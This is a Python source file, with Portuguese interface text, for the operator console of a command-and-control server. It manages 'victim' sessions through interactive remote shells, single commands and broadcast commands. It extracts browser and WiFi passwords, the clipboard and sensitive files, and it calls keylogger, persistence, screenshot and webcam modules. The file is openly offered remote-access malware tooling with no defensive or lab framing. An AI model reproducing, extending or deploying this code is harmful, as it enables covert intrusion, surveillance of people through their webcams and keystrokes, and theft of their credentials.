import time
import os
from datetime import datetime
from rich.prompt import Prompt
from rich.progress import Progress
from rich.panel import Panel
from rich.table import Table
from rich.box import ROUNDED

def show_help(console):
    help_text = """
Comandos disponíveis:

[bold]Gerenciamento de Sessões:[/bold]
- sessions [-d]         - Listar sessões ativas (-d para detalhes)
- shell [id]            - Iniciar shell interativo com a sessão
- exec [id] [comando]   - Executar comando único
- info [id]             - Mostrar informações detalhadas da sessão
- kill [id]             - Encerrar sessão
- killall               - Encerrar todas as sessões

[bold]Extração de Dados:[/bold]
- extract [id] [tipo]   - Extrair dados da vítima
- download [id] [remoto] [local] - Baixar arquivo
- upload [id] [local] [remoto]   - Upload de arquivo

[bold]Persistência e Monitoramento:[/bold]
- keylogger [id] [start|stop] - Iniciar/parar keylogger
- persistence [id] [método] - Estabelecer persistência
- screenshot [id]       - Capturar tela remota
- webcam [id]           - Capturar webcam remota

[bold]Rede e Comunicação:[/bold]
- port_forward [id] [local] [remoto] [porta] - Encaminhamento de porta
- socks5 [id] [start|stop] [porta] - Proxy SOCKS5
- broadcast [comando]   - Enviar comando para todas as sessões

[bold]Sistema e Utilitários:[/bold]
- clear                 - Limpar a tela
- config                - Mostrar configuração do servidor
- history [n]           - Mostrar histórico de comandos
- set host [ip]         - Alterar endereço de escuta
- set port [porta]      - Alterar porta de escuta
- set key [chave]       - Definir chave de criptografia
- connect [ip] [porta]  - Conectar a uma vítima
- listen                - Modo servidor (receber conexões)
- help                  - Mostrar esta ajuda
- exit                  - Sair do C2

[bold]Tipos de dados para extração:[/bold]
- browser_passwords     - Senhas de navegadores
- system_info           - Informações do sistema
- network_info          - Informações de rede
- files                 - Listar arquivos sensíveis
- processes             - Listar processos
- services              - Listar serviços
- installed_software    - Software instalado
- wifi_passwords        - Senhas WiFi
- clipboard             - Conteúdo da área de transferência
"""
    console.print(Panel.fit(help_text, title="[bold]Ajuda do C2 Server[/bold]", border_style="blue"))

def show_config(server):
    config_table = Table(title="Configuração do Servidor", show_header=False, box=ROUNDED)
    config_table.add_row("Host", server.host)
    config_table.add_row("Porta", str(server.port))
    config_table.add_row("Modo", server.mode)
    config_table.add_row("Criptografia", "Ativada" if server.encryption.key else "Desativada")
    config_table.add_row("Clientes conectados", str(len(server.clients)))
    config_table.add_row("Sessões ativas", str(len(server.sessions)))
    server.console.print(config_table)

def interactive_shell(server, session_id):
    if session_id not in server.sessions:
        server.console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
        return
        
    client_ip = server.clients[session_id]['address'][0]
    server.console.print(f"[green]Iniciando shell interativo com sessão {session_id}[/green]")
    server.console.print("[yellow]Digite 'exit' para sair do shell, 'clear' para limpar a tela[/yellow]")
    
    # Limpar buffer anterior
    if session_id in server.clients:
        server.clients[session_id]['buffer'] = b''
    
    while True:
        try:
            # Prompt personalizado com cores
            command = Prompt.ask(f"[bold red]c2[/bold red][bold blue] {client_ip}[/bold blue] [bold yellow]>>[/bold yellow] ")
            
            if command.lower() in ['exit', 'quit']:
                break
                
            if command.lower() == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                server.console.print(f"[green]Shell interativo - Sessão {session_id}[/green]")
                continue
                
            if not command.strip():
                continue
                
            # Comandos especiais para extração de dados
            if command.lower() == 'screenshot':
                server.console.print("[yellow]Solicitando screenshot...[/yellow]")
                command = "screenshot_capture"
            elif command.lower() == 'webcam':
                server.console.print("[yellow]Solicitando captura de webcam...[/yellow]")
                command = "webcam_capture"
            elif command.lower() == 'record screen':
                server.console.print("[yellow]Solicitando gravação de tela...[/yellow]")
                command = "record_screen 10"  # 10 segundos
                
            # Enviar comando
            if not server.send_command(session_id, command):
                break
            
            # Aguardar resposta
            start_time = time.time()
            response_received = False
            
            while time.time() - start_time < 30:  # Timeout de 30 segundos
                if session_id in server.clients and server.clients[session_id]['buffer']:
                    # Verificar se há resposta no buffer
                    buffer = server.clients[session_id]['buffer']
                    
                    try:
                        # Tentar descriptografar
                        decoded_buffer = buffer.decode('utf-8', errors='ignore')
                        if server.encryption.key:
                            decoded_buffer = server.encryption.decrypt(decoded_buffer)
                            
                        if "RESULT:" in decoded_buffer:
                            # Extrair a resposta
                            parts = decoded_buffer.split("RESULT:", 1)
                            if len(parts) > 1:
                                result = parts[1]
                                server.console.print(f"[green]Resposta:[/green]\n{result}")
                                # Limpar buffer processado
                                server.clients[session_id]['buffer'] = b''
                                response_received = True
                                break
                    except:
                        # Fallback para processamento binário
                        if b"RESULT:" in buffer:
                            parts = buffer.split(b"RESULT:", 1)
                            if len(parts) > 1:
                                result = parts[1].decode('utf-8', errors='ignore')
                                server.console.print(f"[green]Resposta:[/green]\n{result}")
                                server.clients[session_id]['buffer'] = b''
                                response_received = True
                                break
                
                time.sleep(0.1)
            
            if not response_received:
                server.console.print("[red]Nenhuma resposta recebida dentro do tempo limite[/red]")
                # Limpar buffer para evitar processamento incorreto posterior
                if session_id in server.clients:
                    server.clients[session_id]['buffer'] = b''
                
        except KeyboardInterrupt:
            server.console.print("\n[yellow]Shell interrompido[/yellow]")
            break
        except Exception as e:
            server.console.print(f"[red]Erro no shell: {e}[/red]")
            break

def exec_command(server, session_id, command):
    """Executa um comando único e mostra o resultado"""
    if session_id not in server.sessions:
        server.console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
        return False
        
    # Limpar buffer anterior
    if session_id in server.clients:
        server.clients[session_id]['buffer'] = b''
    
    # Enviar comando
    if not server.send_command(session_id, command):
        return False
    
    server.console.print(f"[yellow]Executando '{command}' na sessão {session_id}...[/yellow]")
    
    # Aguardar resposta
    start_time = time.time()
    response_received = False
    
    with Progress() as progress:
        task = progress.add_task("[yellow]Aguardando resposta...[/yellow]", total=30)
        
        while not response_received and time.time() - start_time < 30:
            progress.update(task, advance=1)
            time.sleep(1)
            
            if session_id in server.clients and server.clients[session_id]['buffer']:
                buffer = server.clients[session_id]['buffer']
                
                try:
                    decoded_buffer = buffer.decode('utf-8', errors='ignore')
                    if server.encryption.key:
                        decoded_buffer = server.encryption.decrypt(decoded_buffer)
                        
                    if "RESULT:" in decoded_buffer:
                        parts = decoded_buffer.split("RESULT:", 1)
                        if len(parts) > 1:
                            result = parts[1]
                            server.console.print(Panel.fit(result, title=f"[bold]Resultado - Sessão {session_id}[/bold]"))
                            server.clients[session_id]['buffer'] = b''
                            response_received = True
                except:
                    if b"RESULT:" in buffer:
                        parts = buffer.split(b"RESULT:", 1)
                        if len(parts) > 1:
                            result = parts[1].decode('utf-8', errors='ignore')
                            server.console.print(Panel.fit(result, title=f"[bold]Resultado - Sessão {session_id}[/bold]"))
                            server.clients[session_id]['buffer'] = b''
                            response_received = True
    
    if not response_received:
        server.console.print("[red]Nenhuma resposta recebida dentro do tempo limite[/red]")
        if session_id in server.clients:
            server.clients[session_id]['buffer'] = b''
    
    return response_received

def process_command(server, command_input):
    """Processa comandos do console principal"""
    command = command_input.split()
    cmd = command[0].lower()
    args = command[1:]
    
    if cmd == "help":
        show_help(server.console)
        
    elif cmd == "clear":
        server.clear_screen()
        
    elif cmd == "sessions" or cmd == "list":
        detailed = "-d" in args or "--detailed" in args
        server.list_clients(detailed)
        
    elif cmd == "shell":
        if not args:
            server.console.print("[red]Uso: shell [id_sessão][/red]")
        else:
            try:
                session_id = int(args[0])
                interactive_shell(server, session_id)
            except ValueError:
                server.console.print("[red]ID de sessão deve ser um número[/red]")
    
    elif cmd == "exec":
        if len(args) < 2:
            server.console.print("[red]Uso: exec [id_sessão] [comando][/red]")
        else:
            try:
                session_id = int(args[0])
                command_str = " ".join(args[1:])
                exec_command(server, session_id, command_str)
            except ValueError:
                server.console.print("[red]ID de sessão deve ser um número[/red]")
    
    elif cmd == "extract":
        if len(args) < 2:
            server.console.print("[red]Uso: extract [id_sessão] [tipo_dados][/red]")
        else:
            try:
                session_id = int(args[0])
                data_type = args[1]
                server.extract_data(session_id, data_type)
            except ValueError:
                server.console.print("[red]ID de sessão deve ser um número[/red]")
                
    elif cmd == "info":
        if not args:
            server.console.print("[red]Uso: info [id_sessão][/red]")
        else:
            try:
                session_id = int(args[0])
                if session_id in server.clients:
                    client = server.clients[session_id]
                    info_table = Table(title=f"Informações Detalhadas - Sessão {session_id}", show_header=False, box=ROUNDED)
                    info_table.add_row("Endereço", f"{client['address'][0]}:{client['address'][1]}")
                    info_table.add_row("Usuário", client['username'])
                    info_table.add_row("Sistema", client['os'])
                    info_table.add_row("Privilégios", client['privileges'])
                    info_table.add_row("Conectado em", client['connected_at'])
                    info_table.add_row("Última atividade", f"{(datetime.now() - client['last_active']).total_seconds():.0f} segundos atrás")
                    info_table.add_row("Tipo", "Vítima" if client.get('is_victim', False) else "Cliente")
                    info_table.add_row("Info", client['info'])
                    server.console.print(info_table)
                else:
                    server.console.print(f"[red]Sessão {session_id} não encontrada[/red]")
            except ValueError:
                server.console.print("[red]ID de sessão deve ser um número[/red]")
                
    elif cmd == "kill":
        if not args:
            server.console.print("[red]Uso: kill [id_sessão][/red]")
        else:
            try:
                session_id = int(args[0])
                if session_id in server.clients:
                    server.remove_client(session_id)
                    server.console.print(f"[green]Sessão {session_id} encerrada[/green]")
                else:
                    server.console.print(f"[red]Sessão {session_id} não encontrada[/red]")
            except ValueError:
                server.console.print("[red]ID de sessão deve ser um número[/red]")
    
    elif cmd == "killall":
        count = len(server.clients)
        for session_id in list(server.clients.keys()):
            server.remove_client(session_id)
        server.console.print(f"[green]Todas as {count} sessões encerradas[/green]")
                
    elif cmd == "broadcast":
        if not args:
            server.console.print("[red]Uso: broadcast [comando][/red]")
        else:
            command_str = " ".join(args)
            successful = 0
            for session_id in list(server.sessions.keys()):
                if server.send_command(session_id, command_str):
                    successful += 1
            server.console.print(f"[green]Comando enviado para {successful} sessões[/green]")
            
    elif cmd == "history":
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except ValueError:
                server.console.print("[red]O limite deve ser um número[/red]")
        server.show_command_history(limit)
        
    elif cmd == "config":
        show_config(server)
        
    elif cmd == "set":
        if len(args) < 2:
            server.console.print("[red]Uso: set [host|port|key] [valor][/red]")
        else:
            setting = args[0].lower()
            value = " ".join(args[1:])
            
            if setting == "host":
                server.change_host(value)
            elif setting == "port":
                server.change_port(value)
            elif setting == "key":
                server.set_encryption_key(value)
            else:
                server.console.print("[red]Configuração inválida. Use: host, port ou key[/red]")
    
    elif cmd == "connect":
        if len(args) < 2:
            server.console.print("[red]Uso: connect [ip] [porta][/red]")
        else:
            target_host = args[0]
            try:
                target_port = int(args[1])
                server.connect_to_victim(target_host, target_port)
            except ValueError:
                server.console.print("[red]Porta deve ser um número[/red]")
    
    elif cmd == "listen":
        server.mode = "server"
        server.console.print("[green]Modo servidor ativado (recebendo conexões)[/green]")
    
    # Novos comandos
    elif cmd == "keylogger":
        from commands.persistence import keylogger_command
        keylogger_command(server, args)
    
    elif cmd == "persistence":
        from commands.persistence import persistence_command
        persistence_command(server, args)
    
    elif cmd == "download":
        from commands.network import download_command
        download_command(server, args)
    
    elif cmd == "upload":
        from commands.network import upload_command
        upload_command(server, args)
    
    elif cmd == "port_forward":
        from commands.network import port_forward_command
        port_forward_command(server, args)
    
    elif cmd == "socks5":
        from commands.network import socks5_command
        socks5_command(server, args)
    
    elif cmd == "screenshot":
        if not args:
            server.console.print("[red]Uso: screenshot [id_sessão][/red]")
        else:
            try:
                session_id = int(args[0])
                server.console.print(f"[yellow]Solicitando screenshot da sessão {session_id}...[/yellow]")
                server.send_command(session_id, "screenshot_capture")
            except ValueError:
                server.console.print("[red]ID de sessão deve ser um número[/red]")
    
    elif cmd == "webcam":
        if not args:
            server.console.print("[red]Uso: webcam [id_sessão][/red]")
        else:
            try:
                session_id = int(args[0])
                server.console.print(f"[yellow]Solicitando captura de webcam da sessão {session_id}...[/yellow]")
                server.send_command(session_id, "webcam_capture")
            except ValueError:
                server.console.print("[red]ID de sessão deve ser um número[/red]")
            
    elif cmd == "exit" or cmd == "quit":
        server.console.print("[yellow]Encerrando servidor C2...[/yellow]")
        server.running = False
        if server.server_socket:
            server.server_socket.close()
        for session_id in list(server.sessions.keys()):
            server.remove_client(session_id)
        return True
        
    else:
        server.console.print(f"[red]Comando não reconhecido: {cmd}[/red]")
    
    return False
